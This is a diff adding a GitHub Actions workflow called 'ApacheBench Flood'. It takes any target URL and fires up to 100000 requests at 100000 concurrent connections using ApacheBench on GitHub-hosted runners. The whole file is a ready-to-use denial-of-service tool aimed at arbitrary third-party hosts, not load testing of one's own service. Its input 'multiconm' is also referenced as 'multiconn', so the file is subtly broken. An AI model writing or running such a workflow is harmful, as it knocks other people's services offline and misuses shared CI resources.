@@ -1,0 +1,29 @@
+name: ApacheBench Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      iptgt:
+        description: "IP Target"
+        required: true
+        default: "http://"
+      numreq:
+        description: "Number of Request(s): "
+        required: true
+        default: "100000"
+      multiconm:
+        description: "Multi Connection: "
+        required: true
+        default: "100000"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Install dependencies
+      run: |
+        sudo apt install apache2-utils
+    - name: Starting Flood...
+      run: |
+        sudo ab -n ${{ github.event.inputs.numreq }} -c ${{ github.event.inputs.multiconn }} ${{ github.event.inputs.iptgt }}
